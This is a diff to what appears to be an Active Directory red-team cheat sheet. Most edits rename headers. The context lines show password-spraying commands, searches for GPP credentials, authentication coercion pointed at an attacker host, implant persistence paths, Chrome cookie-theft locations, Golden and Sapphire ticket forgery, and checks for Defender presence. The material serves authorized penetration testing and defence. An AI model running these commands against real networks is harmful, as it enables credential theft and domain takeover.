@@ -146,7 +146,8 @@
    * `Invoke-DomainPasswordSpray -Password <pass> -Force -OutFile spray.txt`
 
 
-## CrackMapExec
+## CrackMapExec (CME)
+
 * Password Policy
   * `crackmapexec smb <ip> -d <domain> -u <user> -p <pass> --pass-pol`
 * Password Spray
@@ -192,6 +193,7 @@
 
 
 ## Ldapdomaindump
+
 * Kali
    * `ldapdomaindump -u '<domain>\<user>' -p '<pass>' <dc-ip>`
 
@@ -228,6 +230,7 @@
 
 
 ## GPPPassword
+
 * CLI
   * `findstr /S /I cpassword \\<domain>\sysvol\<domain>\policies\*.xml`
 * Impacket
@@ -455,6 +458,7 @@
 
 
 ## Kerberos on Linux
+
 * Install Kerberos client utilities
    * `sudo apt install krb5-user`
 * Set the ticket for impacket use
@@ -723,6 +727,7 @@ $assem = [System.Reflection.Assembly]::Load($data)
 
 
 ## PrivExchange
+
 * https://github.com/Ridter/Exchange2domain
 * Patched as of Feburary 12th, 2019
 
@@ -776,6 +781,7 @@ $assem = [System.Reflection.Assembly]::Load($data)
 
 
 ## Coercer
+
 * https://github.com/p0dalirius/Coercer
 * `sudo python3 -m pip install coercer`
 * `Coercer coerce -l <attacker> -t <dc> -d <domain> -u <user> -p <pass>`
@@ -789,6 +795,7 @@ $assem = [System.Reflection.Assembly]::Load($data)
 
 
 ## PrinterBug
+
 * https://github.com/leechristensen/SpoolSample
 * `SpoolSample.exe <dc> <attacker>`
 
@@ -882,10 +889,10 @@ $assem = [System.Reflection.Assembly]::Load($data)
    * `Get-WmiObject -Query "SELECT * FROM Win32_UserAccount WHERE PasswordRequired=False AND Disabled=False" | select Name`
 
 
-## Domain stuff
+## OSINT stuff
 
-* ADFS
-   * `ADFS discloses a lot of information at the endpoint: /adfs/ls/idpinitiatedsignon.aspx`
+* AD FS
+   * `AD FS discloses a lot of information at the endpoint: /adfs/ls/idpinitiatedsignon.aspx`
 * Discover internal domain name
    * PowerShell
       * `$response = Invoke-WebRequest -Uri https://lyncdiscover.bcc.nl/ -SkipCertificateCheck`
@@ -900,6 +907,7 @@ $assem = [System.Reflection.Assembly]::Load($data)
    * `aquatone-discover -d <domain>`
    * `aquatone-takeover -d <domain>`
 
+
 ## Ldapsearch
 
 * Get all users with an SPN set for Kerberoasting
@@ -909,7 +917,7 @@ $assem = [System.Reflection.Assembly]::Load($data)
    * When LDAP server signing is required the following message will appear: authentication required (8)
 
 
-## Persistence
+## Implant persistence
 
 * Excel
    * `C:\Documents and Settings\<user>\Application Data\Microsoft\Excel\XLSTART\evil.xll`
@@ -919,7 +927,7 @@ $assem = [System.Reflection.Assembly]::Load($data)
    * `C:\Users\<user>\AppData\Local\Microsoft\Teams\current\AUDIOSES.DLL`
 
 
-## Domain Persistence
+## Domain persistence
 
 * Golden Ticket
   * If you have compromised the krbtgt account, you can create a Golden Ticket. This is basically a TGT containing a PAC which states that the user belongs to privileged groups. This PAC is signed with the krbtgt key and embedded in a forged TGT. With this TGT, Service Tickets can then be requested for any resource in the domain.
@@ -931,7 +939,7 @@ $assem = [System.Reflection.Assembly]::Load($data)
   * Sapphire Tickets are similar to Diamond tickets, as a ticket is not forged, but a legitimate ticket is requested and modified. However, instead of adding privileged groups to the PAC, a legitimate privileged user PAC is gained by S4U tricks. This legitimate PAC is then embedded in the legitimate TGT. This makes it very difficult to detect effectively. To perform this last attack, you need to use this pull request:: https://github.com/SecureAuthCorp/impacket/pull/1411/files.
 
 
-## Loot
+## Steal cookies
 
 * Chrome
    * `C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Local State`
@@ -953,7 +961,8 @@ $assem = [System.Reflection.Assembly]::Load($data)
    * `dir \\<domain>\SYSVOL`
 
 
-## MDE
+## MDE check
+
 * Check for MDE existence:
   * Running process: Task Manager > Details > MsSense.exe
   * Running service: Task Manager > Services > Sense
@@ -966,7 +975,13 @@ $assem = [System.Reflection.Assembly]::Load($data)
   * MsSense.exe: Main Microsoft Defender for Endpoint process.
 
 
+## MDI check
+
+* https://github.com/expl0itabl3/check_mdi
+
+
 ## NTLMv1 downgrade
+
 * Check for Compatibility Level:
   * LmCompatibilityLevel = 0x1: Send LM & NTLM
   * `reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v lmcompatibilitylevel`
@@ -997,3 +1012,5 @@ $assem = [System.Reflection.Assembly]::Load($data)
    * `SharpAdidnsdump.exe <dc>`
 * SharpShares
    * `SharpShares.exe /ldap:all`
+* Snaffler
+   * `snaffler.exe -s -o snaffler.log`
